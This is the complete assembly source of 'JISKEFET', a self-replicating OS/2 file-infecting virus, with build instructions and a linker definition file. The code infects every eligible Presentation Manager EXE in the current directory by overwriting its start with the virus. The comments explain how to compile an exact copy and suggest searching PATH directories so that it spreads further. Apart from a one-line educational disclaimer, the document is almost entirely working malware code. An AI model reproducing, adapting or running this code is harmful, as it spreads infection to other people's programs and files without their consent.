comment #

                JISKEFET: a non-resident direct-action OS/2 virus


Disclaimer: This file is only for educational purposes. Do not abuse it!
The author takes no responsibility for anything anyone does with this file.

How does this virus work? Like most non-resident viruses, it first infects
other programs and then runs the original program. It infects programs by
copying the first part of the program (with the same size of the virus) to
the end of the program and then overwriting the begin with the virus. When
an infected program is executed, the virus will make a copy of the infected
program and disinfect it. It will then spawn the disinfected copy. This is
perhaps not a very elegant method. It would be nicer if the virus could just
disinfect the current program and spawn that one. But OS/2 doesn't allow a
program that being executed to be altered.

The proper way to compile this virus is like this: first, just compile it.
Then check the size of the new created exe file. It should be the same as
the value for VIRLEN below. If not, change the value for VIRLEN and compile
again. Unfortunatly, I don't know of a way to tell the compiler what the size
of an EXE file will be after compilation. Also check out the offset of the
'MK' signature in the EXE file. It should be at the offset MKOFF. You might
have to change this one too. To generate an exact copy of the original virus,
use MASM.EXE v5.0 and LINK386.EXE v2.00.000.


COMPILE.BAT:
...............................................................................
masm.exe /Zi %1.asm;
link386.exe /exepack %1.obj,,,doscalls.lib,%1.def
...............................................................................

JISKEFET.DEF:
...............................................................................
name Jiskefet windowapi         ;A virus must have a name. This one is
                                ;dedicated to the people of "Jiskefet",
                                ;the funniest TV program in the Netherlands.
                                ;These guys are really excelent!
                                ;'windowapi' means that this virus will be
                                ;compiled into a P.M. application. 
protmode                        ;It will run in protected mode.
stacksize 8192                  ;Yes, the virus needs some stack.
...............................................................................

The file doscalls.lib should be in the OS/2 directory. Copy it to your work
directory or enter the full pathname in compile.bat.
To compile this file type: compile jiskefet

#
;==============================================================================

                .286                            ;80286 opcodes can be used.
                .radix  16                      ;All numbers are hexadecimal
                                                ;by default.

VIRLEN          equ     2048d                   ;This will be the size of the
                                                ;compiled virus.
MKOFF           equ     400                     ;At this offset in the EXE file
                                                ;will be the 'MK' signature.


_srec           struc                           ;Structure with information
cdate           dw      ?                       ;about file, returned by the
ctime           dw      ?                       ;DosFindFirst and DosFindNext
adate           dw      ?                       ;functions.
atime           dw      ?
wdate           dw      ?
wtime           dw      ?
fsize           dd      ?
falloc          dd      ?
fattr           dw      ?
fcount          db      ?
fname           db      100 dup (?)
_srec           ends

                extrn   DosFindFirst:far        ;These external kernel
                extrn   DosFindNext:far         ;functions are used by the
                extrn   DosFindClose:far        ;virus.
                extrn   DosOpen:far
                extrn   DosClose:far
                extrn   DosRead:far
                extrn   DosWrite:far
                extrn   DosChgFilePtr:far
                extrn   DosNewSize:far
                extrn   DosGetEnv:far
                extrn   DosExecPgm:far
                extrn   DosExit:far
                extrn   DosDelete:far


;------------------------------------------------------------------------------
;               Data
;------------------------------------------------------------------------------

DGROUP          group   _DATA

_DATA           segment word public 'DATA'


                                                ;Variables used by DosFindFirst
                                                ;and DosFindNext functions:
filename        db      '*.EXE', 0              ;  Filenames to search for.
dirhan          dw      ?                       ;  Handle.
sbuf            _srec   <>                      ;  Struct. with returned info.
srchcnt         dw      ?                       ;  Number of files to search.

                                                ;Variables used by DosOpen:
faction         dw      ?                       ;  Open mode.
fhandle         dw      ?                       ;  Handle.
fhandle2        dw      ?                       ;  Handle.

                                                ;Variables used by DosRead
                                                ;and DosWrite:
rlen            dw      ?                       ;  Number of read bytes.
wlen            dw      ?                       ;  Number of written bytes. 

                                                ;Variables used by
                                                ;DosChgFilePtr:
new_off         dw      ?, ?                    ;  New offset.

                                                ;Variables used by DosGetEnv:
envseg          dw      ?                       ;  Segment of environment.
cmdoffs         dw      ?                       ;  Offset of arguments in env.

                                                ;Variables used by DosExecPgm:
objbuf          db      (40) dup (?)            ;  Buffer for error-info.
retcode         dw      ?, ?                    ;  Returns exit-code.

                                                ;Other variables:
NE_buf          db      (40) dup (?)            ;  Buffer for NE header.
namebuf         db      (100) dup (?)           ;  New filename for spawning.
buffer          db      (VIRLEN) dup (?)        ;  Main buffer.

_DATA           ends


;------------------------------------------------------------------------------
;               Main program.
;------------------------------------------------------------------------------

_TEXT           segment word public 'CODE'
                assume  cs:_TEXT, ds:DGROUP

main            proc    far

virus:          db      'MK'                    ;Signature (this translates
                                                ;to: DEC BP, DEC BX).

                call    infect_others           ;Subroutine for infecting
                                                ;other programs.

                call    copy_me                 ;Copy current infected
                                                ;program to temp. file
                                                ;with extension '.MK'.

                push    ds                      ;Disinfect temp. file.
                pop     es                      ;Filename is DS:namebuf.
                mov     dx,offset namebuf
                call    disinfect

                call    myname                  ;Spawn disinfected temp file.
                mov     dx,offset namebuf       ;Get arguments from 'myname'.
                call    spawn

                push    ds                      ;Delete temp. file.
                push    offset namebuf
                push    0
                push    0
                call    DosDelete

                push    1                       ;Exit.
                push    [retcode+2]             ;Get exit-code from spawn.
                call    DosExit

main            endp


;------------------------------------------------------------------------------
;               Infect other programs.
;
; This is a relativly simple routine. It tries to infect all EXE files in the
; current directory. This way the virus will not be very viable, but this is
; the easiest way to do it. To make the virus more viable, one could change
; this subroutine in a way that it also searches other directories. For example
; the directories in the PATH.
;------------------------------------------------------------------------------

                                                ;Find first *.EXE file.
infect_others:  mov     word ptr [dirhan],-1    ;  Initialise some variables.
                mov     word ptr [srchcnt],1

                push    ds                      ;  Ptr to file template.
                push    offset filename
                push    ds                      ;  Ptr to handle.
                push    offset dirhan
                push    0
                push    ds                      ;  Ptr to info-structure.
                push    offset sbuf
                push    size sbuf               ;  Size of info-structure.
                push    ds                      ;  Ptr to search-counter.
                push    offset srchcnt
                push    0
                push    0
                call    DosFindFirst
                or      ax,ax                   ;  Quit if no file found.
                jnz     quit

                                                ;Check if program is larger
                                                ;than virus. Perhaps I should
                                                ;have used .386 code for this.
lus:            cmp     word ptr [sbuf.fsize+2],0
                jnz     len_ok
                cmp     word ptr [sbuf.fsize],VIRLEN
                jbe     nextfile

len_ok:         push    ds                      ;Infect the found EXE file.
                pop     es
                mov     dx,offset sbuf.fname
                call    infect

                                                ;Find next file.
nextfile:       push    [dirhan]                ;  Handle.
                push    ds                      ;  Ptr to info-structure.
                push    offset sbuf
                push    size sbuf               ;  Size of info-structure.
                push    ds                      ;  Ptr to search-counter.
                push    offset srchcnt
                call    DosFindNext
                or      ax,ax                   ;  Jump back if another file
                jz      lus                     ;  found.

quit:           push    [dirhan]                ;Close search-handle.
                call    DosFindClose

                ret


;------------------------------------------------------------------------------
;               Infect a file.
;
;               input:  ES:DX -> filename
;
; First, the begin of the file (with the same size of the virus) is read into
; the buffer. This part is appended to the end of the file. Then the virus
; is written over the begin of the file. The virus is read from the begin of
; the current executed program. Note that this is the complete virus including
; the EXE header of the virus etc, not just the memory image which is being
; executed now. By doing it this way we don't have to fuck with the EXE header
; and NE header of the victim. That would make the virus far more complex. 
;------------------------------------------------------------------------------

infect:         mov     bx,offset fhandle       ;Open the file.
                mov     ax,42                   ;  Open for read and write.
                mov     cx,1                    ;  Just open the file.
                call    open
                or      ax,ax
                jnz     stop_inf

                call    readbuf                 ;Read begin of file.
                or      ax,ax                   ;(Same size as virus)
                jnz     close_inf

                call    checkfile               ;Check if program may be
                or      ax,ax                   ;infected.
                jnz     close_inf

                call    go_end                  ;Go to end of file.

                call    writebuf                ;Write original begin to end.
                or      ax,ax
                jnz     close_inf

                call    myname                  ;Open current program.
                mov     bx,offset fhandle2
                mov     ax,40                   ;  Open for read-only.
                mov     cx,1
                call    open
                or      ax,ax
                jnz     close_inf

                mov     bx,[fhandle2]           ;Read begin of current program
                mov     cx,VIRLEN               ;(= virus!) in buffer.
                mov     dx,offset buffer
                call    read
                or      ax,ax
                jnz     close_inf2

                call    go_begin                ;Go to begin of file.

                call    writebuf                ;Write virus.

close_inf2:     push    [fhandle2]              ;Close current program.
                call    DosClose

close_inf:      push    [fhandle]               ;Close file
                call    DosClose

stop_inf:       ret


;------------------------------------------------------------------------------
;               Check the file.
;
;               output:  AX = can file be infected?
;
; Can it be infected or not? The file must be a valid OS/2 EXE file. Only
; programs that use the Presentation Manager will be infected. For some
; reason the program must be of the same type as the virus. If the virus
; itself is not a P.M. program, infected P.M. programs will not run. If
; the virus is a P.M. program, infected non-P.M. programs will not run.
; Because I think most OS/2 programs use the Presentation Manager, I decided
; to make this virus a P.M. virus.
;------------------------------------------------------------------------------

checkfile:      mov     si,offset buffer        ;SI points to EXE header of
                                                ;file to infect.

                cmp     word ptr [si],'ZM'      ;Is it an EXE file?
                jne     file_bad

                cmp     byte ptr [si+MKOFF],'M' ;Is it already infected?
                je      file_bad

                cmp     word ptr [si+18],40     ;is it an OS/2 EXE file?
                jb      file_bad                ;Value at [0018] must be
                                                ;40h or greater.

                mov     ax,[si+3C]              ;Check if offset to NE header
                mov     dx,[si+3E]              ;is zero or not.
                mov     cx,ax
                or      cx,dx
                jz      file_bad

                call    go                      ;Go to NE header in file.
                or      ax,ax
                jnz     file_bad

                mov     bx,[fhandle]            ;Read the NE header.
                mov     cx,40
                mov     dx,offset NE_buf
                mov     si,dx
                call    read
                or      ax,ax
                jnz     file_bad

                cmp     word ptr [si],'XL'      ;Is it an LX header?
                jne     check_NE

                cmp     byte ptr [si+0A],1      ;  Is it a true OS/2 file?
                jne     file_bad

                cmp     byte ptr [si+11],3      ;  Is it a P.M. program?
                jne     file_bad

                jmp     short file_ok

check_NE:       cmp     word ptr [si],'EN'      ;Or is it an NE header?
                jne     file_bad

                cmp     byte ptr [si+36],1      ;  Is it a true OS/2 file?
                jne     file_bad

                cmp     byte ptr [si+0Dh],3     ;  Is it a P.M. program?
                jne     file_bad

file_ok:        xor     ax,ax                   ;Conclusion: Yes, the file
                ret                             ;may be infected.

file_bad:       mov     ax,1                    ;Conclusion: No, This file
                ret                             ;should not be fucked with.


;------------------------------------------------------------------------------
;               Disinfect a file.
;
;               input:  ES:DX -> filename
;
; This is done by copying the original begin of the file, which is now appended
; at the end, back to the begin. After that, the appended piece is cut off and
; then the file is restored exactly as it was before.
;------------------------------------------------------------------------------

disinfect:      mov     bx,offset fhandle       ;Open the file.
                mov     ax,42                   ;  Open for read/write.
                mov     cx,1
                call    open
                or      ax,ax
                jnz     stop_dis

                                                ;Go to original end of file.
                call    go_end                  ;  Go to end.
                mov     ax,[new_off]            ;  Get current file size.
                mov     dx,[new_off+2]
                sub     ax,VIRLEN               ;  Calculate original size
                sbb     dx,0                    ;  by substracting virus size.
                push    ax                      ;  Save this offset on stack.
                push    dx
                call    go                      ;  Go there.

                call    readbuf                 ;Read original begin.

                call    go_begin                ;Go to begin of file.

                call    writebuf                ;Restore original begin.

                pop     dx                      ;Get original size from stack.
                pop     ax

                push    [fhandle]               ;Truncate file to original
                push    dx                      ;size.
                push    ax
                call    DosNewSize

                push    [fhandle]               ;Close the file.
                call    DosClose

stop_dis:       ret


;------------------------------------------------------------------------------
;               Get own filename.
;
;               output: ES:0  -> environment
;                       ES:DX -> filename
;                       ES:BX -> arguments
;------------------------------------------------------------------------------

                                                ;Get address of environment.
myname:         push    ds                      ;  Ptr to segment of env.
                push    offset envseg
                push    ds                      ;  Ptr to arguments of program.
                push    offset cmdoffs
                call    DosGetEnv

                mov     es,[envseg]             ;ES:BX now points to arguments.
                mov     bx,[cmdoffs]

                xor     di,di                   ;Search name of current
                mov     al,0                    ;program.
                mov     cx,-1                   ;Program name follows after
                cld                             ;double zero in environment.
scan:   repnz   scasb
                scasb
                jne     scan
                mov     dx,di                   ;ES:DX now points to name of
                ret                             ;current program.


;------------------------------------------------------------------------------
;               Copy current program to temp. file
;------------------------------------------------------------------------------

copy_me:        push    ds

                call    myname                  ;Copy filename *.EXE -> *.MK
                push    ds                      ;  Let DS:SI point to current
                push    es                      ;  filename.
                pop     ds                      ;  Let ES:DI point to new
                pop     es                      ;  filename.
                mov     si,dx
                mov     di,offset namebuf
name_loop:      lodsb                           ;  Copy characters until zero
                or      al,al                   ;  found.
                jz      moved
                stosb
                jmp     short name_loop
moved:          sub     di,3                    ;  Change extension of new
                mov     ax,'KM'                 ;  filename into ".MK".
                stosw
                mov     al,0
                stosb

                pop     ds


                call    myname                  ;Open current program.
                mov     bx,offset fhandle
                mov     ax,40                   ;  Open for read-only.
                mov     cx,1                    ;  Just open it.
                call    open
                or      ax,ax
                jnz     stop_copy


                push    ds                      ;Create temp. file.
                pop     es
                mov     dx,offset namebuf
                mov     bx,offset fhandle2
                mov     ax,41                   ;  Open for write-only.
                mov     cx,12                   ;  Create new file.
                call    open
                or      ax,ax
                jnz     stop_copy1

copy_lus:       call    readbuf                 ;Read a part of current
                or      ax,ax                   ;program.
                jnz     stop_copy2
                cmp     word ptr [rlen],0       ;Quit if no more could be read.
                jz      stop_copy2

                mov     bx,[fhandle2]           ;Write that part to new file.
                mov     cx,[rlen]
                mov     dx,offset buffer
                call    write

                jmp     short copy_lus          ;Repeat until whole file
                                                ;is copied.

stop_copy2:     push    [fhandle2]              ;Close both files.
                call    DosClose

stop_copy1:     push    [fhandle]
                call    DosClose

stop_copy:      ret


;------------------------------------------------------------------------------
;               Spawn original program
;
;               input:  DS:DX -> filename
;                       ES:BX -> arguments
;               output: AX = return code
;------------------------------------------------------------------------------

spawn:          push    ds                      ;Ptr to error-info buffer.
                push    offset objbuf
                push    40                      ;Length of that buffer.
                push    0                       ;Synchronic spawning.
                push    es                      ;Ptr to arguments.
                push    bx
                push    0                       ;Ptr to environment. Zero
                push    0                       ;means: inherit from parrent.
                push    ds                      ;Ptr to exit-code
                push    offset retcode
                push    ds                      ;Name of program to spawn.
                push    dx
                call    DosExecPgm
                ret


;------------------------------------------------------------------------------
;               Read & Write.
;
;               input:  DS:DX -> buffer
;                       CX = length
;                       BX = handle
;------------------------------------------------------------------------------

readbuf:        mov     bx,[fhandle]            ;Read a block with same size
                mov     cx,VIRLEN               ;as virus into buffer.
                mov     dx,offset buffer
                                                ;Or just read as much as you
                                                ;like and where you like.
read:           push    bx                      ;  Handle.
                push    ds                      ;  Ptr to buffer.
                push    dx
                push    cx                      ;  Number of bytes to read.
                push    ds                      ;  Ptr to variable that gets
                push    offset rlen             ;  number of read bytes.
                call    DosRead
                ret


writebuf:       mov     bx,[fhandle]            ;Same for writing...
                mov     cx,VIRLEN
                mov     dx,offset buffer
write:          push    bx
                push    ds
                push    dx
                push    cx
                push    ds
                push    offset wlen
                call    DosWrite
                ret


;------------------------------------------------------------------------------
;               Go to some place in the file.
;
;               input:  DX,AX = offset
;------------------------------------------------------------------------------

                                                ;Go to end of file.
go_end:         push    [fhandle]               ;  Handle.
                push    0                       ;  Offset.
                push    0
                push    2                       ;  Relative to end of file.
                push    ds                      ;  Ptr to variable that gets
                push    offset new_off          ;  new file pointer.
                call    DosChgFilePtr
                ret

go_begin:       xor     ax,ax                   ;Go to begin.
                cwd
go:             push    [fhandle]               ;Or go wherever you like.
                push    dx
                push    ax
                push    0                       ;  Relative to begin of file.
                push    ds
                push    offset new_off
                call    DosChgFilePtr
                ret


;------------------------------------------------------------------------------
;               Open a file.
;
;               input:  ES:DX -> filename
;                       DS:BX -> handle
;                       AX = open mode
;                       CX = open flag
;------------------------------------------------------------------------------

open:           push    es                      ;Ptr to filename.
                push    dx
                push    ds                      ;Ptr to handle.
                push    bx
                push    ds                      ;Ptr to variable that gets
                push    offset faction          ;info about results of open.
                push    0                       ;Initial size if file is 
                push    0                       ;created. (this is ignored)
                push    0                       ;Attributes if file is created.
                                                ;(this is ignored)
                push    cx                      ;Open flag: What to do if file
                                                ;already exists or not.
                push    ax                      ;Open mode: Read, write, share?
                push    0                       ;Reserved.
                push    0
                call    DosOpen                 ;Open it!
                ret


;------------------------------------------------------------------------------
;               This is the end...
;------------------------------------------------------------------------------

_TEXT           ends
                end     main
